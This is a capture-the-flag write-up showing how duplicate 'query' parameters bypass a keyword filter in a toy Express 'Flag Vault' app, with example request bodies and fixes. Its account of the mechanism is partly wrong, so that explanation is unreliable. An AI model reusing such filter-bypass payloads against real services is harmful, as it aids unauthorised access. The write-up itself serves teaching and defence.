# Baby Web CTF Challenge Writeup

**Category:** Web  

## Challenge Description

Enter the right key and retrieve the flag? Sound easy right?

## Initial Analysis

Upon accessing the challenge, we're presented with a simple web interface titled "Flag Vault" that asks us to enter an exact key to unlock the flag.

Let's examine the provided source code:

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 10009;

app.use(bodyParser.urlencoded({ extended: true }));

const key = "randomBytes(16).toString('hex')";

// ... HTML page code ...

app.post('/search', (req, res) => {
  const query = req.body.query;
  
  // Filter check
  if (query.includes("String")) {
    return res.send(htmlPage("❌ Access Denied: Suspicious pattern detected."));
  }
  
  // Key check
  if (query.includes(key)) {
    return res.send(htmlPage("✅ Key matched: " + query + "\n🎉 Here is your flag: fakeflag{...}"));
  } else {
    return res.send(htmlPage("❌ Key did not match."));
  }
});
```

## Vulnerability Analysis

### The Logical Impossibility

After analyzing the code, we immediately notice a critical design flaw:

1. **The key is defined as:** `"randomBytes(16).toString('hex')"`
2. **The filter blocks any input containing:** `"String"`
3. **However, the key itself contains:** `toString` which contains `String`

This creates an **impossible condition** - we cannot enter the correct key without triggering the security filter!

### The Real Vulnerability: HTTP Parameter Pollution

The vulnerability lies in how Express.js with `bodyParser.urlencoded()` handles duplicate parameter names. When multiple parameters share the same name, Express.js behavior can be inconsistent.

## Exploitation

### Understanding Parameter Pollution

When we send a request like:
```
query=value1&query=value2
```

Express.js might handle this in different ways:
- `req.body.query` becomes an array: `["value1", "value2"]`
- Takes the last value: `"value2"`
- Takes the first value: `"value1"`

The key insight is that the filter check and key check might process these parameters **differently**.

### The Attack Strategy

We can exploit this inconsistency by sending:
1. **First parameter:** A "safe" value that doesn't contain "String"
2. **Second parameter:** The actual key that matches our target

### Proof of Concept

Using Burp Suite, we intercept the POST request and modify the request body:

**Original request:**
```http
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=randomBytes%2816%29.toString%28%27hex%27%29
```

**Modified request:**
```http
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=safe&query=randomBytes%2816%29.toString%28%27hex%27%29
```

### How the Exploit Works

1. **Filter Check:** `if (query.includes("String"))`
   - Processes the first parameter: `"safe"`
   - Since "safe" doesn't contain "String", the filter passes ✅

2. **Key Check:** `if (query.includes(key))`
   - Processes the second parameter or the entire array
   - Finds the key `"randomBytes(16).toString('hex')"` and matches ✅

## Alternative Exploitation Methods

Several variations of this attack can work:

1. **Empty first parameter:**
   ```
   query=&query=randomBytes%2816%29.toString%28%27hex%27%29
   ```

2. **Array notation:**
   ```
   query[]=safe&query[]=randomBytes%2816%29.toString%28%27hex%27%29
   ```

3. **Multiple parameters:**
   ```
   query=test&query=dummy&query=randomBytes%2816%29.toString%28%27hex%27%29
   ```

## Solution

1. Intercept the POST request using Burp Suite or similar proxy
2. Modify the request body to include parameter pollution:
   ```
   query=safe&query=randomBytes%2816%29.toString%28%27hex%27%29
   ```
3. Forward the request
4. Receive the flag in the response

## Flag

```
fakeflag{not the flag, and i love teh ais :D}
```

## Key Takeaways

- **Poor Input Validation:** The developer created a logically impossible condition
- **Parameter Pollution:** Express.js can handle duplicate parameters inconsistently
- **Defense:** Always validate input consistently and avoid contradictory security checks
- **Lesson:** Security filters should be thoroughly tested for edge cases and bypass techniques

## Mitigation

To fix this vulnerability:

1. **Use strict equality instead of `.includes()`:**
   ```javascript
   if (query === key) { // Exact match only
   ```

2. **Consistent parameter handling:**
   ```javascript
   // Ensure query is always a string
   const query = Array.isArray(req.body.query) ? req.body.query[0] : req.body.query;
   ```

3. **Proper key generation:**
   ```javascript
   // Actually generate a random key instead of using a string literal
   const crypto = require('crypto');
   const key = crypto.randomBytes(16).toString('hex');
   ```

This challenge demonstrates how subtle implementation details can create significant security vulnerabilities, especially when dealing with HTTP parameter parsing in web frameworks.
